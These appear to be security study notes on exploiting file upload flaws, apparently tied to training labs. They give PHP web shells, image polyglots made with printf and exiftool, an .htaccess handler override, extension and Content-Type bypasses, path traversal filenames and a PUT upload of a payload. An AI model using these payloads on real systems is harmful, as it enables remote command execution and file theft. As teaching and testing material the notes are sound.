
```bash
curl -X POST "http://$target/file-upload" -F "file=@test.txt" -F "filename=test.txt"
```

A more versatile web shell may look something like this:

```bash
<?php echo system($_GET['cmd']); ?>
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

```
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

This script enables you to pass an arbitrary system command via a query parameter as follows: `GET /example/exploit.php?command=id HTTP/1.1` The following PHP one-liner could be used to read arbitrary files from the server's filesystem: `<?php echo file_get_contents('/path/to/target/file'); ?>`
### Flawed file type validation
One way that websites may attempt to validate file uploads is to check that this input-specific `Content-Type` header matches an expected MIME type. If the server is only expecting image files, for example, it may only allow types like `image/jpeg` and `image/png`. Problems can arise when the value of this header is implicitly trusted by the server. `Content-Type: application/x-php -> Content-Type: image/png`
### Preventing file execution in user-accessible directories
Web servers often use the `filename` field in `multipart/form-data` requests to determine the name and location where the file should be saved. `Content-Disposition: form-data; name="avatar";` **filename="exploit.php"** -> `Content-Disposition: form-data; name="avatar";` **filename="..%2Fexploit.php"**
### Overriding the server configuration
Apache servers, for example, will load a directory-specific configuration from a file called `.htaccess` if one is present. PHP files will be processed as another type of file, bypassing the blacklist. `.htaccess` -> AddType application/x-httpd-php .htaccessAddtype Similarly, developers can make directory-specific configuration on IIS servers using a `web.config` file.
```bash
# Make the following changes in POST /my-account/avatar
- Change the value of the filename parameter to .htaccess.
- Change the value of the Content-Type header to text/plain.
- Replace the contents of the file (your PHP payload) with the following Apache directive: AddType application/x-httpd-php .l33t(.l33t can be any value, e.i .shell)
```

```
Change the value of the `filename` parameter from exploit.php to exploit.l33t. Send the request again and notice that the file was uploaded successfully.
```
### Obfuscating file extensions
```bash
# URL encoding 
exploit.pHp - exploit.php.jpg - exploit.php. - exploit%2Ephp - exploit.p.phphp
# Semicolons
exploit.asp;.jpg - exploit.php;.jpg
# null byte
exploit.asp%00.jpg - exploit.php%00.jpg
```
### Flawed validation of the file's contents
JPG files always begin with the bytes `FF D8 FF`
- _magic bytes or magic numbers_ Using special tools, such as ExifTool, it can be trivial to create a polyglot JPEG file containing malicious code within its metadata.

```bash
printf "\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\n <?php echo system(\$_GET['cmd']); ?>" > web_shell.jpg
echo 'GIF8<?php system($_GET["cmd"]); ?>' > web_shell.jpg
echo 'GIF8<?php system($_GET["cmd"]); ?>' > web_shell.gif
```
### Polyglot web shell
```bash
exiftool -Comment='<?php echo "START - " . system($_GET["cmd"]) . " - END"; ?>' hacker.jpg -o polyglot.php
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
```
### Uploading files using PUT
It's worth noting that some web servers may be configured to support `PUT` requests. If appropriate defenses aren't in place, this can provide an alternative means of uploading malicious files, even when an upload function isn't available via the web interface.

`PUT /images/exploit.php HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-httpd-php Content-Length: 49 <?php echo file_get_contents('/path/to/file'); ?>`
#### Tip
You can try sending `OPTIONS` requests to different endpoints to test for any that advertise support for the `PUT` method.